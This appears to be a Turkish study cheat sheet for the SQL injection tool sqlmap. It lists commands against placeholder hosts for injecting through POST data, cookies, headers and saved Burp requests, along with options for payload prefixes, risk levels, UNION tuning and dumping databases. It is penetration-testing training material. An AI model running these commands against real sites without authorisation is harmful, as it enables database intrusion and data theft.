---
{"dg-publish":true,"permalink":"/cheat-sheet/sql-map-ch/"}
---


Not : SQLMap'deki `--data` seçeneği, **POST istekleri** sırasında sunucuya gönderilen verilerin belirtildiği bir parametredir. Bu seçenek, SQLMap'in POST tabanlı parametreler üzerinde SQL enjeksiyon testi yapmasını sağlar.

### 1- Curl Commands (Get İsteği - Inspect)

![Pasted image 20241214175823.png](/img/user/resimler/Pasted%20image%2020241214175823.png)


Clipboard içeriğini (Ctrl-V) komut satırına yapıştırarak ve orijinal curl komutunu sqlmap olarak değiştirerek, SQLMap'i aynı curl komutuyla kullanabiliyoruz:



### 2-GET/POST Requests

```shell-session
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

```shell-session
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

![Pasted image 20241214180558.png](/img/user/resimler/Pasted%20image%2020241214180558.png)


### 3-Full HTTP Requests (Burp)

`Copy > Copy Request Headers`

```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

```shell-session
sqlmap -r req.txt
```

İpucu: '--data' seçeneğinde olduğu gibi, kaydedilen istek dosyasında da enjekte etmek istediğimiz parametreyi `'/?id=*'` gibi bir yıldız işaretiyle `(*)` belirtebiliriz.

### 4-Custom SQLMap Talepleri

#### cookie parametresi 

```shell-session
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

#### Header cookie parametresi 

```shell-session
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

Aynı HTTP başlıklarının değerlerini belirtmek için kullanılan --host, --referer ve -A/--user-agent gibi seçenekler için de aynı şeyi uygulayabiliriz.


#### `--host`, `--referer` ve `-A/--user-agent` Seçenekleri

```shell-session
sqlmap -u 'http://www.example.com/' --host='www.example.com'

sqlmap -u 'http://www.example.com/' --referer='http://google.com'

sqlmap -u 'http://www.example.com/' -A='Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
```


#### `--random-agent` Seçeneği

Rastgele bir `User-agent` değeri seçmek için kullanılır.

```shell-session
sqlmap -u 'http://www.example.com/' --random-agent
```



#### `--mobile` Seçeneği

Tarayıcının bir mobil cihazı taklit etmesini sağlar.

```shell-session
sqlmap -u 'http://www.example.com/' --mobile
```


#### Diğer Başlıkların Test Edilmesi

```shell-session
# Host başlığında SQL enjeksiyonu testi

sqlmap -u 'http://www.example.com/' --host='www.example.com*'



# Referer başlığında SQL enjeksiyonu testi

sqlmap -u 'http://www.example.com/' --referer='http://google.com*'



# User-agent başlığında SQL enjeksiyonu testi

sqlmap -u 'http://www.example.com/' -A='Mozilla/5.0 (Windows NT 10.0; Win64; x64)*'
```



#### Tam İsteğe Özgü Enjeksiyon Testi

```shell-session
sqlmap -u 'http://www.example.com/' --data='uid=1&name=test' --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c*'
```


#### Full Kombinasyon 

```shell-session
sqlmap -u 'http://www.example.com/' \

--data='uid=1&name=test' \

--cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c*' \

--referer='http://google.com*' \

-A='Mozilla/5.0 (Windows NT 10.0; Win64; x64)*' \

--random-agent
```



#### Custom HTTP Requests (JSON ve XML)

```shell-session
M1R4CKCK@htb[/htb]$ cat req.txt
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}
```


```shell-session
 sqlmap -r req.txt
```



### 5-BATCH

SQLMap'teki **`--batch`** parametresi, aracı tam otomatik modda çalıştırmaya yarar. Bu parametre, SQLMap'in çalışması sırasında kullanıcıdan herhangi bir onay veya ek bilgi istememesini sağlar.

```shell-session
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```



### 6- Store the Traffic (-t)

```shell-session
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```


### 7-Verbose Output (-v)

```shell-session
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```


### 8-Using Proxy (Burp)

```shell-session
sqlmap -r asd3.txt --batch --dump --proxy=http://127.0.0.1:8080
```

### 9-Prefix/Suffix

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

### 10-Level/Risk (5-3)


```shell-session
sqlmap -u www.example.com/?id=1 --level=5 --risk=3
```

### 11-Status Codes

Eğer **TRUE** yanıtlarında HTTP durumu `200 OK`, ancak **FALSE** yanıtlarında `500 Internal Server Error` alıyorsanız, `--code` seçeneği ile SQLMap'e **200** durum kodunu doğruluk kriteri olarak kullanmasını söyleyebilirsiniz.

```shell-session
sqlmap -u "http://target.com/page?id=1" --code=200
```


### 12-Başlıklar

Hedefteki yanıtlar arasındaki fark, **HTML sayfa başlıkları** ile ayırt ediliyorsa:

```shell-session
sqlmap -u "http://target.com/page?id=1" --titles
```

### 13-Stringler

Yanıtların içinde belirli bir string varsa, bu string üzerinden doğrulama yapılabilir:

```shell-session
sqlmap -u "http://target.com/page?id=1" --string="success"
```


### 14-Sadece Metin

Yanıtlarda **HTML etiketleri** gibi fazlalıklar varsa ve yalnızca metin içeriği önemliyse:

```shell-session
sqlmap -u "http://target.com/page?id=1" --text-only
```


### 15-Teknikler

Belirli bir SQLi tekniğiyle sınırlı test yapmak isterseniz:

```shell-session
sqlmap -u "http://target.com/page?id=1" --technique=BEU
```


### 16-UNION SQLi Ayarları

UNION tabanlı SQL enjeksiyonunda **kolon sayısını manuel olarak belirtmek**

```shell-session
sqlmap -u "http://target.com/page?id=1" --union-cols=5
```



### 17-UNION karakteri ayarlama (`--union-char`)

UNION tabanlı sorgularda varsayılan `NULL` yerine başka bir karakter kullanmak için: Eğer hedef, UNION sorgularında `NULL` kullanıldığında hata veriyor, ancak `"a"` gibi bir karakter kullanılınca çalışıyorsa, bu seçenekle alternatif bir karakter belirtebilirsiniz.

```shell-session
sqlmap -u "http://target.com/page?id=1" --union-char='a'
```


### 18-Tablo ekleme (`--union-from`)

UNION sorgusunun sonunda bir tablo belirtmek gerekirse: Oracle veritabanında UNION sorgusunun doğru çalışması için `FROM users` gibi bir tablo adı eklenmesi gerekiyorsa bu seçenek kullanılır.

```shell-session
sqlmap -u "http://target.com/page?id=1" --union-from=users
```


----
